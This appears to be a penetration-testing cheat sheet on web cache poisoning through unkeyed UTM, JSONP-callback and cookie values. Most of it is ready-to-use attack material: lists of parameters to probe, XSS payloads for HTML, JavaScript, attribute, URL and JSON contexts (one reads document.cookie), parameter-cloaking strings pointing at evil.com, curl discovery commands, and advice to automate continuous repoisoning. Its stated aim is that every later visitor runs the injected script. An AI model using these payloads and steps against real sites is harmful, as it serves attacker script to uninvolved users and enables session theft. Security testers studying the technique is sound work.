# Cache Poisoning — Unkeyed Query Parameters / Cookies

## When this applies

- UTM / tracking / callback / cookie parameters are reflected into responses but NOT included in the cache key.
- Marketing pages, JSONP endpoints, and analytics-instrumented pages are typical targets.
- Goal: poison the cache via `?utm_content=<payload>` or `Cookie: fehost=<payload>` so all subsequent users execute the XSS.

## Technique

Identify a reflected query parameter / cookie. Confirm it's NOT in the cache key (response served from cache to other users with different param values). Inject a context-appropriate XSS payload. Poison and wait for `X-Cache: hit`.

## Steps

### Parameters to test

**UTM analytics:**
```
utm_source
utm_medium
utm_campaign
utm_content
utm_term
```

**Social media tracking:**
```
gclid          # Google Click ID
fbclid         # Facebook Click ID
msclkid        # Microsoft Click ID
twclid         # Twitter Click ID
li_fat_id      # LinkedIn First-Party ID
```

**Affiliate & marketing:**
```
tracking_id
affiliate_id
ref
referrer
promo
coupon_code
```

**JSONP callbacks:**
```
callback
jsonp
cb
```

### Cookies to test

```http
# Feature flags
Cookie: fehost=VALUE

# Session identifiers (if not in cache key)
Cookie: session_id=VALUE

# User preferences
Cookie: lang=VALUE
Cookie: currency=VALUE
Cookie: theme=VALUE

# A/B testing
Cookie: variant=VALUE
Cookie: experiment=VALUE
```

### XSS payloads — query parameters

**HTML context:**
```
?utm_content='/><script>alert(1)</script>
?utm_content=<img src=x onerror=alert(1)>
?utm_content=<svg onload=alert(1)>
```

**JavaScript context:**
```
?callback=';alert(1);//
?callback='+alert(1)+'
?callback="-alert(1)-"
```

**Attribute context:**
```
?param=" onload="alert(1)
?param=' autofocus onfocus='alert(1)
?param=javascript:alert(1)
```

**URL context:**
```
?redirect=javascript:alert(1)
?url=data:text/html,<script>alert(1)</script>
```

### XSS payloads — cookies

**JavaScript string context:**
```http
Cookie: fehost="-alert(1)-"
Cookie: fehost=";alert(1);//
Cookie: fehost='+alert(1)+'
```

**JSON context:**
```http
Cookie: data=","x":"<img src=x onerror=alert(1)>
Cookie: data=}};alert(1);//
```

**HTML context:**
```http
Cookie: name=<script>alert(1)</script>
Cookie: name=<img src=x onerror=alert(1)>
```

### DOM-based payloads

For innerHTML:
```json
{"country": "<img src=x onerror=alert(document.cookie)>"}
{"data": "<svg onload=alert(1)>"}
```

For JS injection:
```json
{"callback": "alert(1)"}
{"function": "eval('alert(1)')"}
```

### Vulnerable code examples

**UTM in HTML:**
```html
<link rel="canonical" href="<?= $_GET['utm_content'] ?>" />
```
Attack: `?utm_content='/><script>alert(1)</script>`
Result: `<link rel="canonical" href="'/><script>alert(1)</script>" />`

**Cookie in JavaScript:**
```javascript
data = {"host":"<?= $_COOKIE['fehost'] ?>"}
```
Attack: `Cookie: fehost="-alert(1)-"`
Result: `data = {"host":""-alert(1)-""}`

**Callback parameter:**
```javascript
<?= $_GET['callback'] ?>({"data":"value"});
```
Attack: `?callback=alert(1)`
Result: `alert(1)({"data":"value"});`

### Parameter cloaking (Rails / semicolon parser)

```
/api?safe=ok;callback=evil
/path?utm_content=1;redirect_uri=https://evil.com
```

**Cache sees**: `safe=ok;callback=evil` (one parameter)
**Backend sees**: `safe=ok` AND `callback=evil` (two parameters)

**Param Miner trigger:**
```
Right-click request → Extensions → Param Miner → "Rails parameter cloaking scan"
```

### cURL discovery

```bash
curl "https://target.com/?utm_content=test123"
curl "https://target.com/?utm_content=different"
# If second shows X-Cache: hit, parameter is unkeyed
```

```bash
curl https://target.com/ \
  -H "Cookie: session=xyz; fehost=testvalue"
```

### Quick win scenarios

**Marketing site:**
- High chance of unkeyed UTM parameters
- Test: `utm_content`, `utm_source`, `utm_campaign`
- Often reflected in `<link rel="canonical">`
- Quick XSS: `?utm_content='/><script>alert(1)</script>`

**JSONP API:**
- Callback parameters often unkeyed
- Test: `callback`, `jsonp`, `cb`
- Quick XSS: `?callback=alert(1)`

**Ruby on Rails app:**
- Parameter cloaking via semicolons
- Test: `?safe=ok;target=evil`
- Common in older Rails versions

## Verifying success

- Reflection of the param/cookie value in HTML/JS context.
- Cache hit on repeat with the SAME URL (after cache-buster removed).
- Different cookies / fresh session retrieves the poisoned response — proving cache-level persistence.

## Common pitfalls

- Some apps URL-decode parameters before reflection — payload may need different encoding.
- CSP can block inline `<script>` execution — test with onerror/onload event handlers.
- Cache may have a short TTL — script continuous repoisoning.

## Tools

- Burp Param Miner (Guess GET parameters / Rails cloaking)
- Burp Suite Repeater
- Turbo Intruder (continuous poisoning)
- nuclei templates
- Python `requests`
